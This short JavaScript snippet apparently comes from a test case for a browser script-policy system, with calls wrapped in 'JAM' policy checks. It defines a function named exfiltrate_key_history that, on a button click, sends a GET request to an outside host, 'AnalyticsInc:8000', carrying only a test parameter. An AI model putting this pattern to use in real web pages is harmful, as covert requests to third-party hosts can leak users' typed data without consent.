function exfiltrate_key_history() {
  newreq = XMLHttpRequest;
  xmlhttp = new newreq;
  JAM.call(JAM.get(xmlhttp, "open", JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074), xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone4", true]);
  xmlhttp.send(null);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history);

